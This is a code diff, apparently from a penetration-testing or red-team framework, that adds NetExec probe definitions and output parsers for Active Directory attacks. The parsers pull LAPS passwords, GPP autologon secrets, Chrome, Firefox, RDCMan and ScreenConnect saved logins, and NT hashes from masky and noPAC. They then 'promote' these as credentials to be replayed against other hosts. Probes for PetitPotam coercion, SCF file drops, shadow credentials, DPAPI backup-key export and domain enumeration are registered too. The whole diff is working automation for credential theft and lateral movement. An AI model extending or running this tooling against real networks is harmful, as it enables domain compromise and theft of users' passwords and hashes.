@@ -306,6 +306,490 @@ def parse_coerce_plus(text):
     return result
 
 
+_LAPS_V2 = re.compile(r"Account:\s*(?P<user>[^\s]+)\s*Password:\s*(?P<pw>\S+)", re.I)
+
+
+def parse_laps_v2(text):
+    """``nxc smb ... -M laps`` with Windows LAPS v2 (msLAPS-Password / encrypted blob
+    delivered via LAPSv2 schema). Output surfaces ``Account: <computer$>  Password: <pw>``
+    pairs that promote directly to local-admin credentials for the named host."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        m = _LAPS_V2.search(raw)
+        if m:
+            user, pw = m.group("user"), m.group("pw")
+            result.findings.append(ProbeFinding(
+                kind="laps_password",
+                title=f"LAPS v2 password: {user}",
+                severity="Critical", evidence=raw.strip(), admin=True))
+            result.credentials.append(PromotedCredential(
+                username=user, secret=pw, source="nxc-probe:laps_v2"))
+    return result
+
+
+def parse_gpp_autologin(text):
+    """``nxc smb ... -M gpp_autologin`` — unattend.xml / AutoLogon in SYSVOL. Prints
+    ``[+] Found <path>`` + ``Username: ..`` + ``Password: ..``. Credentials typically
+    local-admin on fresh builds — promote them."""
+    result = ProbeResult(ok=True, raw_output=text)
+    user = None
+    for raw in _strip_ansi(text).splitlines():
+        body = raw.strip()
+        if body.lower().startswith("username:"):
+            user = body.split(":", 1)[1].strip()
+        elif body.lower().startswith("password:") and user:
+            pw = body.split(":", 1)[1].strip()
+            result.findings.append(ProbeFinding(
+                kind="gpp_autologin",
+                title=f"autologin credential: {user}",
+                severity="High", evidence=f"{user}:{pw}"))
+            result.credentials.append(PromotedCredential(
+                username=user, secret=pw, source="nxc-probe:gpp_autologin"))
+            user = None
+    return result
+
+
+def parse_chrome(text):
+    """``nxc smb ... -M chrome`` — Chrome Login Data via remote SMB file read + DPAPI
+    decrypt loop. Emits ``[+] <url> <user> <password>`` for each decrypted login."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        body = raw.split("]", 1)[-1].strip() if "]" in raw else raw.strip()
+        if not body or body.lower().startswith("chrome"):
+            continue
+        parts = body.split()
+        if len(parts) >= 3 and ("://" in parts[0] or parts[0].startswith("http")):
+            url, user, pw = parts[0], parts[1], " ".join(parts[2:])
+            result.findings.append(ProbeFinding(
+                kind="browser_credential",
+                title=f"Chrome saved login: {user}@{url}",
+                severity="High", evidence=raw.strip()))
+            result.credentials.append(PromotedCredential(
+                username=user, secret=pw, source="nxc-probe:chrome"))
+    return result
+
+
+def parse_firefox(text):
+    """``nxc smb ... -M firefox`` — reads logins.json + key4.db off the target over SMB
+    and decrypts via libnss. Output shape mirrors chrome: url user pass."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        body = raw.split("]", 1)[-1].strip() if "]" in raw else raw.strip()
+        if not body or body.lower().startswith("firefox"):
+            continue
+        parts = body.split()
+        if len(parts) >= 3 and ("://" in parts[0] or parts[0].startswith("http")):
+            url, user, pw = parts[0], parts[1], " ".join(parts[2:])
+            result.findings.append(ProbeFinding(
+                kind="browser_credential",
+                title=f"Firefox saved login: {user}@{url}",
+                severity="High", evidence=raw.strip()))
+            result.credentials.append(PromotedCredential(
+                username=user, secret=pw, source="nxc-probe:firefox"))
+    return result
+
+
+def parse_keepass_discover(text):
+    """``nxc smb ... -M keepass_discover`` — finds .kdbx + .config files across the
+    target's shares. Prints ``[+] Found: <UNC path>``. The path IS the finding; the
+    operator's next step is to loot + crack it offline."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        body = raw.strip()
+        low = body.lower()
+        if ("found" in low or "discovered" in low) and (".kdbx" in low or "keepass" in low):
+            result.findings.append(ProbeFinding(
+                kind="keepass_database",
+                title=f"KeePass database: {body[:100]}",
+                severity="High", evidence=raw.strip()))
+    return result
+
+
+def parse_masky(text):
+    """``nxc smb ... -M masky`` — abuses an enrolled client-authentication certificate
+    template to request a cert for the LOGGED-ON user on the target. Prints
+    ``[+] Successfully retrieved <user> NT hash: <hash>``."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        body = raw.strip()
+        low = body.lower()
+        if "nt hash" in low and ":" in body:
+            # Pull "USER ... NT hash: <hash>" best-effort
+            tail = body.rsplit(":", 1)[-1].strip()
+            if re.fullmatch(r"[0-9a-fA-F]{32}", tail):
+                # Walk back to find the username token
+                tokens = body.split()
+                user = ""
+                for i, tok in enumerate(tokens):
+                    if tok.lower().startswith("retrieved") and i + 1 < len(tokens):
+                        user = tokens[i + 1].rstrip(":")
+                        break
+                result.findings.append(ProbeFinding(
+                    kind="nt_hash",
+                    title=f"masky — NT hash recovered: {user or '<user>'}",
+                    severity="Critical", evidence=raw.strip()))
+                if user:
+                    result.credentials.append(PromotedCredential(
+                        username=user, secret=tail, secret_type="ntlm",
+                        source="nxc-probe:masky"))
+    return result
+
+
+_RDP_LINE = re.compile(r"(?P<host>\S+)\s*\\\s*(?P<user>\S+?)\s*:\s*(?P<pw>.+)$")
+
+
+def parse_drop_sc(text):
+    """``nxc smb ... -M drop-sc`` — ScreenConnect config dump. Prints
+    ``[+] Found config: <path>`` + a ``URL/User/Password`` triple per
+    cached server."""
+    result = ProbeResult(ok=True, raw_output=text)
+    url = user = None
+    for raw in _strip_ansi(text).splitlines():
+        body = raw.strip()
+        low = body.lower()
+        if low.startswith("url:"):
+            url = body.split(":", 1)[1].strip()
+        elif low.startswith("user:") or low.startswith("username:"):
+            user = body.split(":", 1)[1].strip()
+        elif low.startswith("password:") and user:
+            pw = body.split(":", 1)[1].strip()
+            result.findings.append(ProbeFinding(
+                kind="screenconnect_credential",
+                title=f"ScreenConnect cached: {user}@{url or '<unknown>'}",
+                severity="High", evidence=f"{user}:{pw}"))
+            result.credentials.append(PromotedCredential(
+                username=user, secret=pw, domain=url or "",
+                source="nxc-probe:drop_sc"))
+            user = None
+    return result
+
+
+def parse_scuffy(text):
+    """``nxc smb ... -M scuffy`` — scheduled-task persistence via UNC
+    icon load. The module writes a .scf file whose IconFile points at
+    an attacker-controlled UNC; opening the folder in Explorer coerces
+    the viewer's machine account to authenticate. Output: ``[+] File
+    written to <share path>``."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        low = raw.lower()
+        if ".scf" in low and ("written" in low or "uploaded" in low or "placed" in low):
+            result.findings.append(ProbeFinding(
+                kind="scuffy_dropped",
+                title=f"SCF coerce file planted: {raw.strip()[:100]}",
+                severity="High", evidence=raw.strip()))
+    return result
+
+
+def parse_spooler(text):
+    """``nxc smb ... -M spooler`` — Print Spooler service status. Prints
+    ``[+] Spooler service is enabled`` on hits — feeds the PrinterBug
+    coerce chain. Vulnerable targets listed as High."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        low = raw.lower()
+        if "spooler" in low and ("enabled" in low or "running" in low):
+            result.findings.append(ProbeFinding(
+                kind="print_spooler_enabled",
+                title=f"Print Spooler enabled: {raw.strip()[:100]}",
+                severity="High", evidence=raw.strip()))
+    return result
+
+
+def parse_ldap_checker(text):
+    """``nxc ldap ... -M ldap-checker`` — LDAP signing + channel-binding
+    posture check. Vulnerable DCs: ``[+] <host> does not require signing``
+    or ``[+] <host> does not require channel binding``."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        low = raw.lower()
+        if "does not require" in low and ("signing" in low or "channel binding" in low):
+            result.findings.append(ProbeFinding(
+                kind="ldap_relay_candidate",
+                title=f"LDAP relay candidate: {raw.strip()[:100]}",
+                severity="High", evidence=raw.strip()))
+    return result
+
+
+_OBS_NT_HASH = re.compile(r"^(?P<user>[A-Za-z0-9_$.-]+)\s+.*(?:pre-?2004|obsolete)", re.I)
+
+
+def parse_obsolete_nt_hash_users(text):
+    """``nxc ldap ... -M obsolete_nt_hash_users`` — accounts whose NT hash
+    was computed with the pre-2004 (DES-based) algorithm. These crack
+    FASTER than modern NT hashes and are strong hashcat priorities.
+    Output: ``<user>  <lastchanged>  pre2004``."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        m = _OBS_NT_HASH.search(raw)
+        if m:
+            result.findings.append(ProbeFinding(
+                kind="obsolete_nt_hash",
+                title=f"pre-2004 NT hash: {m.group('user')}",
+                severity="Medium", evidence=raw.strip()))
+    return result
+
+
+def parse_pre2k(text):
+    """``nxc ldap ... -M pre2k`` — pre-2000 compatibility computer
+    accounts (DontRequirePreAuth or password == computer_name_lowercased).
+    Output: ``[+] <host>$ — pre2k auth works``."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        low = raw.lower()
+        if "pre2k" in low and ("works" in low or "success" in low or "weak" in low):
+            # Try to extract the account name
+            parts = raw.split()
+            acct = next((p for p in parts if p.endswith("$")), "")
+            result.findings.append(ProbeFinding(
+                kind="pre2k_computer_account",
+                title=f"pre-2000 computer account: {acct or '<unknown>'}",
+                severity="High", evidence=raw.strip(), admin=False))
+            if acct:
+                # The password is the lowercased hostname (without $) — that's
+                # the pre2k shape. Promote it so the credential loop replays
+                # it against SMB on that host.
+                pw = acct[:-1].lower()
+                result.credentials.append(PromotedCredential(
+                    username=acct, secret=pw, source="nxc-probe:pre2k"))
+    return result
+
+
+def parse_get_network(text):
+    """``nxc ldap ... -M get-network`` — AD Sites + Subnets objects. Prints
+    one subnet CIDR per line (``10.0.0.0/24  Site: HQ``). Internal network
+    map — asset-enum, not credential."""
+    result = ProbeResult(ok=True, raw_output=text)
+    seen = set()
+    for raw in _strip_ansi(text).splitlines():
+        body = raw.strip()
+        m = re.search(r"(\d+\.\d+\.\d+\.\d+/\d+)(?:\s+Site:\s*(\S+))?", body)
+        if m:
+            cidr, site = m.group(1), m.group(2) or ""
+            if cidr in seen:
+                continue
+            seen.add(cidr)
+            result.findings.append(ProbeFinding(
+                kind="ad_subnet",
+                title=f"AD subnet: {cidr}" + (f" ({site})" if site else ""),
+                severity="Info", evidence=body))
+    return result
+
+
+def parse_groupmembership(text):
+    """``nxc ldap ... -M groupmembership`` — enumerate a specific group's
+    membership. Output: ``[+] Member: <sAMAccountName>``."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        body = raw.split("]", 1)[-1].strip() if "]" in raw else raw.strip()
+        if body.lower().startswith("member:"):
+            member = body.split(":", 1)[1].strip()
+            if member:
+                result.findings.append(ProbeFinding(
+                    kind="group_member",
+                    title=f"group member: {member}",
+                    severity="Info", evidence=raw.strip()))
+    return result
+
+
+def parse_rid_brute(text):
+    """``nxc smb ... --rid-brute`` — walk the RID space on a target that
+    allows NULL / Guest SAMR enumeration. Output: ``\\<domain>\\<user>
+    (SidTypeUser)``, ``...SidTypeGroup``, etc."""
+    result = ProbeResult(ok=True, raw_output=text)
+    seen = set()
+    for raw in _strip_ansi(text).splitlines():
+        body = raw.strip()
+        m = re.search(r"\\?(?P<dom>[^\\]+)\\(?P<name>[^(]+?)\s*\((?P<kind>SidType\w+)\)", body)
+        if m:
+            key = (m.group("dom"), m.group("name"))
+            if key in seen:
+                continue
+            seen.add(key)
+            kind_map = {"SidTypeUser": "domain_user",
+                        "SidTypeGroup": "domain_group",
+                        "SidTypeAlias": "domain_alias"}
+            result.findings.append(ProbeFinding(
+                kind=kind_map.get(m.group("kind"), "domain_object"),
+                title=f"{m.group('dom')}\\{m.group('name')} ({m.group('kind')})",
+                severity="Info", evidence=body))
+    return result
+
+
+def parse_users_computers(text):
+    """``nxc ldap ... --users --computers`` systematic snapshot. Lines
+    look like ``[*] <sAMAccountName>  <description>`` for users and
+    ``[*] <host>$  <os_version>`` for computers. We tag by presence of
+    trailing $ in the first token."""
+    result = ProbeResult(ok=True, raw_output=text)
+    seen = set()
+    for raw in _strip_ansi(text).splitlines():
+        body = raw.split("]", 1)[-1].strip() if "]" in raw else raw.strip()
+        tokens = body.split()
+        if not tokens:
+            continue
+        name = tokens[0]
+        if name in seen or not re.fullmatch(r"[A-Za-z0-9_.$-]+", name):
+            continue
+        seen.add(name)
+        if name.endswith("$"):
+            result.findings.append(ProbeFinding(
+                kind="domain_computer",
+                title=f"computer: {name}",
+                severity="Info", evidence=body))
+        else:
+            result.findings.append(ProbeFinding(
+                kind="domain_user",
+                title=f"user: {name}",
+                severity="Info", evidence=body))
+    return result
+
+
+def parse_petitpotam(text):
+    """``nxc smb ... -M petitpotam`` — MS-EFSRPC coerce. Vulnerable targets
+    print ``[+] <host> is vulnerable to PetitPotam`` or ``[+] Target
+    coerced``. The finding is the pivot: coerce the target's machine
+    account into authenticating to our relay/listener."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        low = raw.lower()
+        if "petitpotam" in low and ("vulnerable" in low or "coerced" in low):
+            result.findings.append(ProbeFinding(
+                kind="petitpotam_coerce",
+                title=f"PetitPotam coerce available: {raw.strip()[:80]}",
+                severity="High", evidence=raw.strip()))
+    return result
+
+
+_NOPAC_HASH = re.compile(r"(?P<user>[A-Za-z0-9_$.-]+):(?P<rid>\d+):"
+                        r"(?P<lm>[0-9a-f]{32}):(?P<nt>[0-9a-f]{32})", re.I)
+
+
+def parse_nopac(text):
+    """``nxc smb ... -M nopac`` — CVE-2021-42278 / CVE-2021-42287 S4U2self
+    + sAMAccountName spoof chain. Vulnerable DCs cough up a TGT for a
+    privileged account; the module dumps the NT hash."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        low = raw.lower()
+        if "nopac" in low and ("vulnerable" in low or "success" in low):
+            result.findings.append(ProbeFinding(
+                kind="nopac_vulnerable",
+                title=f"noPAC vulnerable DC: {raw.strip()[:80]}",
+                severity="Critical", evidence=raw.strip(), admin=True))
+        m = _NOPAC_HASH.search(raw)
+        if m:
+            user, nt = m.group("user"), m.group("nt")
+            result.credentials.append(PromotedCredential(
+                username=user, secret=nt, secret_type="ntlm",
+                source="nxc-probe:nopac"))
+    return result
+
+
+def parse_lsa_backup_keys(text):
+    """``nxc smb ... -M lsa_backup_keys`` — DPAPI backup-key export. The
+    module prints the path to the written .pvk + the DPAPI master-key
+    GUID. The .pvk decrypts every DPAPI blob on every machine in the
+    domain — crown-jewel loot."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        low = raw.lower()
+        if ".pvk" in low and ("saved" in low or "written" in low or "exported" in low):
+            result.findings.append(ProbeFinding(
+                kind="dpapi_backup_key",
+                title=f"DPAPI domain backup key exported: {raw.strip()[:100]}",
+                severity="Critical", evidence=raw.strip(), admin=True))
+        elif "backup key" in low and "found" in low:
+            result.findings.append(ProbeFinding(
+                kind="dpapi_backup_key",
+                title=f"DPAPI backup key discovered: {raw.strip()[:100]}",
+                severity="High", evidence=raw.strip()))
+    return result
+
+
+def parse_dpapi_ng(text):
+    """``nxc smb ... -M dpapi-ng`` — the newer DPAPI-NG primitive used for
+    LAPS v2 + KeyCredentials + certain Chromium v20+ cookies. Module
+    prints decrypted entries line by line."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        low = raw.lower()
+        if ("decrypted" in low or "unprotected" in low) and ":" in raw:
+            result.findings.append(ProbeFinding(
+                kind="dpapi_ng_decrypted",
+                title=f"DPAPI-NG decrypted: {raw.strip()[:100]}",
+                severity="High", evidence=raw.strip()))
+    return result
+
+
+def parse_rdcman(text):
+    """``nxc smb ... -M rdcman`` — Remote Desktop Connection Manager stores
+    RDP creds in an XML file with DPAPI-encrypted passwords. Module reads
+    + decrypts them, printing ``server\\user:password`` triples."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        body = raw.split("]", 1)[-1].strip() if "]" in raw else raw.strip()
+        if "\\" in body and ":" in body:
+            # Try to parse "SERVER\user:password" — tight shape to avoid
+            # eating noise lines.
+            left, _, pw = body.rpartition(":")
+            if "\\" in left and pw and " " not in pw[:20]:
+                srv, _, user = left.rpartition("\\")
+                if srv and user:
+                    result.findings.append(ProbeFinding(
+                        kind="rdcman_credential",
+                        title=f"RDCMan saved credential: {left}",
+                        severity="High", evidence=raw.strip()))
+                    result.credentials.append(PromotedCredential(
+                        username=user, secret=pw, domain=srv,
+                        source="nxc-probe:rdcman"))
+    return result
+
+
+def parse_enum_dns(text):
+    """``nxc ldap ... -M enum_dns`` — pulls the AD-integrated DNS zones:
+    every host record, service record, and (sometimes) wildcard entry.
+    The output is a map of the internal network — asset-enum, not a
+    credential — so findings are Info / Medium severity."""
+    result = ProbeResult(ok=True, raw_output=text)
+    seen = set()
+    for raw in _strip_ansi(text).splitlines():
+        body = raw.split("]", 1)[-1].strip() if "]" in raw else raw.strip()
+        # Record shape: "host.corp.local  A    10.0.0.5"
+        m = re.match(r"(\S+?)\s+(A|AAAA|CNAME|SRV|MX|TXT)\s+(.+)$", body)
+        if m:
+            host, rtype, val = m.group(1), m.group(2), m.group(3)
+            key = (host, rtype, val)
+            if key in seen:
+                continue
+            seen.add(key)
+            result.findings.append(ProbeFinding(
+                kind="dns_record",
+                title=f"AD DNS: {host} {rtype} {val}",
+                severity="Info", evidence=raw.strip()))
+    return result
+
+
+def parse_shadowcredentials(text):
+    """``nxc ldap ... -M shadowcredentials`` — msDS-KeyCredentialLink primitive. On a
+    successful write the module prints ``[+] Shadow credentials added`` and a PFX /
+    certificate path that becomes the TGT material for the target."""
+    result = ProbeResult(ok=True, raw_output=text)
+    for raw in _strip_ansi(text).splitlines():
+        low = raw.lower()
+        if "shadow credential" in low and ("added" in low or "success" in low):
+            result.findings.append(ProbeFinding(
+                kind="shadow_credentials",
+                title="msDS-KeyCredentialLink write succeeded",
+                severity="Critical", evidence=raw.strip(), admin=True))
+        elif ".pfx" in low or ("certificate" in low and "saved" in low):
+            result.findings.append(ProbeFinding(
+                kind="shadow_credentials",
+                title=f"Shadow Credentials cert: {raw.strip()[:100]}",
+                severity="High", evidence=raw.strip()))
+    return result
+
+
 # ------------------------------------------------------------- registry
 
 PROBES = (
@@ -330,6 +814,55 @@ PROBES = (
           "smb", ("-M", "ms17-010",)),
     Probe("coerce_plus", "multi-protocol auth coercer (PetitPotam / DFSCoerce / etc.)",
           "smb", ("-M", "coerce_plus",)),
+    # axis 2 slice 2 — browser extraction, cert pivots, high-value module hits
+    Probe("laps_v2", "Windows LAPS v2 (msLAPS-Password / encrypted blob)",
+          "smb", ("-M", "laps",), requires_admin=False),
+    Probe("gpp_autologin", "AutoLogon / unattend.xml in SYSVOL",
+          "smb", ("-M", "gpp_autologin",)),
+    Probe("chrome", "Chrome saved logins + cookies (remote DPAPI decrypt)",
+          "smb", ("-M", "chrome",), requires_admin=True),
+    Probe("firefox", "Firefox logins.json + key4.db (remote NSS decrypt)",
+          "smb", ("-M", "firefox",), requires_admin=True),
+    Probe("keepass_discover", "KeePass .kdbx databases across readable shares",
+          "smb", ("-M", "keepass_discover",)),
+    Probe("masky", "Kerberos cert enrollment pivot (NT hash of logged-on user)",
+          "smb", ("-M", "masky",), requires_admin=True),
+    Probe("shadowcredentials", "msDS-KeyCredentialLink write primitive",
+          "ldap", ("-M", "shadowcredentials",)),
+    # axis 2 slice 3 — DC coercion, PAC-less tickets, DPAPI backup keys, RDCMan, DNS
+    Probe("petitpotam", "PetitPotam MS-EFSRPC coerce",
+          "smb", ("-M", "petitpotam",)),
+    Probe("nopac", "noPAC — CVE-2021-42278 + 42287 chain",
+          "smb", ("-M", "nopac",)),
+    Probe("lsa_backup_keys", "DPAPI domain backup keys (crown-jewel loot)",
+          "smb", ("-M", "lsa_backup_keys",), requires_admin=True),
+    Probe("dpapi_ng", "DPAPI-NG decrypt (LAPS v2 / KeyCreds / Chromium v20+)",
+          "smb", ("-M", "dpapi-ng",), requires_admin=True),
+    Probe("rdcman", "Remote Desktop Connection Manager saved credentials",
+          "smb", ("-M", "rdcman",), requires_admin=True),
+    Probe("enum_dns", "AD-integrated DNS zone enumeration (asset mapping)",
+          "ldap", ("-M", "enum_dns",)),
+    # axis 2 slice 5 — remaining credential probes + findings + asset-enum
+    Probe("drop_sc", "ScreenConnect config dump (cached server credentials)",
+          "smb", ("-M", "drop-sc",), requires_admin=True),
+    Probe("scuffy", "SCF file UNC coerce (persistence drop)",
+          "smb", ("-M", "scuffy",)),
+    Probe("spooler", "Print Spooler service enumeration (feeds PrinterBug)",
+          "smb", ("-M", "spooler",)),
+    Probe("ldap_checker", "LDAP signing + channel-binding posture",
+          "ldap", ("-M", "ldap-checker",)),
+    Probe("obsolete_nt_hash_users", "accounts with pre-2004 NT hashes (cracks fast)",
+          "ldap", ("-M", "obsolete_nt_hash_users",)),
+    Probe("pre2k", "pre-2000 compat computer accounts (password == hostname)",
+          "ldap", ("-M", "pre2k",)),
+    Probe("get_network", "AD Sites + Subnets objects (internal network map)",
+          "ldap", ("-M", "get-network",)),
+    Probe("groupmembership", "membership enumeration of a target group",
+          "ldap", ("-M", "groupmembership",)),
+    Probe("rid_brute", "SAMR RID-space brute (user/group enum when LDAP is restricted)",
+          "smb", ("--rid-brute",)),
+    Probe("users_computers", "systematic AD user + computer snapshot",
+          "ldap", ("--users", "--computers")),
 )
 
 
@@ -346,6 +879,29 @@ PARSERS = {
     "nanodump": parse_nanodump,
     "ms17_010": parse_ms17_010,
     "coerce_plus": parse_coerce_plus,
+    "laps_v2": parse_laps_v2,
+    "gpp_autologin": parse_gpp_autologin,
+    "chrome": parse_chrome,
+    "firefox": parse_firefox,
+    "keepass_discover": parse_keepass_discover,
+    "masky": parse_masky,
+    "shadowcredentials": parse_shadowcredentials,
+    "petitpotam": parse_petitpotam,
+    "nopac": parse_nopac,
+    "lsa_backup_keys": parse_lsa_backup_keys,
+    "dpapi_ng": parse_dpapi_ng,
+    "rdcman": parse_rdcman,
+    "enum_dns": parse_enum_dns,
+    "drop_sc": parse_drop_sc,
+    "scuffy": parse_scuffy,
+    "spooler": parse_spooler,
+    "ldap_checker": parse_ldap_checker,
+    "obsolete_nt_hash_users": parse_obsolete_nt_hash_users,
+    "pre2k": parse_pre2k,
+    "get_network": parse_get_network,
+    "groupmembership": parse_groupmembership,
+    "rid_brute": parse_rid_brute,
+    "users_computers": parse_users_computers,
 }
 
 
